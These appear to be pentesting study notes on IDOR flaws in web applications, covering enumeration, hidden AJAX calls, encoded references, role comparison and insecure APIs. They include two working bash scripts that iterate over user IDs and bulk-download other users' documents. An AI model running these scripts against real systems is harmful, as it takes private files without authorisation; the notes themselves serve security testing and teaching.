# IDOR

### 1) Enumeration

Whenever we receive a specific file or resource, we should study the HTTP requests to look for URL parameters or APIs with an object reference (e.g. ?uid=1 or ?filename=file_1.pdf). These are mostly found in URL parameters or APIs but may also be found in other HTTP headers, like cookies.

Another example could be that the UID of the user is being used by adding it to a part of the filename, from the example below we can see that there could be no access control and therefore create a script to perform the enumeration of all files:

    # UID=1
    /documents/Invoice_1_09_2021.pdf
    /documents/Report_1_10_2021.pdf
    
    # UID=2
    /documents/Invoice_2_08_2020.pdf
    /documents/Report_2_12_2020.pdf

Replace in the URL and directories the proper values

    # Script with regex to find the documents
    #!/bin/bash
    
    url="http://SERVER_IP:PORT"
    
    for i in {1..10}; do
            for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                    wget -q $url/$link
            done
    done

    # Alternative script option to find any extension
    #!/bin/bash
    
    url="http://SERVER_IP:PORT"
    
    for i in {1..20}; do
        for link in $(curl -s -X POST -d "uid=$i" "$url/documents.php" | grep -oP "\/documents.*?\\.\\w+"); do
            curl -O $url/$link
        done
    done

### 2) AJAX Calls

We may also be able to identify unused parameters or APIs in the front-end code in the form of JavaScript AJAX calls. Some web applications developed in JavaScript frameworks may insecurely place all function calls on the front-end and use the appropriate ones based on the user role.

    // Code Example
    function changeUserPassword() {
        $.ajax({
            url:"change_password.php",
            type: "post",
            dataType: "json",
            data: {uid: user.uid, password: user.password, is_admin: is_admin},
            success:function(result){
                //
            }
        });
    }

The above function may never be called when we use the web application as a non-admin user. However, if we locate it in the front-end code, we may test it in different ways to see whether we can call it to perform changes, which would indicate that it is vulnerable to IDOR. We can do the same with back-end code if we have access to it.

### 3) Hashing and Encoding

Sometimes the reference is encoded or hashed (file_123.pdf):

    Encoded: download.php?filename=ZmlsZV8xMjMucGRm
    Hashed: download.php?filename=c81e728d9d4c2f636f067f89cc14862c

### 4) Compare User Roles

If we want to perform more advanced IDOR attacks, we may need to register multiple users and compare their HTTP requests and object references. This may allow us to understand how the URL parameters and unique identifiers are being calculated and then calculate them for other users to gather their data.

If we have 2 users one of which can view the salary with the API call; repeat the same API call as User2 . If it works means that the web app requires only a valid logged-in session to make API call but there isno access control on backend to verify the data being called by the user : 

    {
      "attributes" : 
        {
          "type" : "salary",
          "url" : "/services/data/salaries/users/1"
        },
      "Id" : "1",
      "Name" : "User1"
    }

### 5) Insecure APIs

We could see calls to APIs like the one below, in such cases we can perform enumeration of the API similar to the web application, if there is some form of backend control, we could try changing both the UID (for this example) and the URL.

    {
        "uid": 1,
        "uuid": "40f5888b67c246df7efba008e7c2f9d2",
        "role": "employee",
        "full_name": "emma LastName",
        "email": "emma@employees.com",
        "about": "A pentester and red teamer."
    }
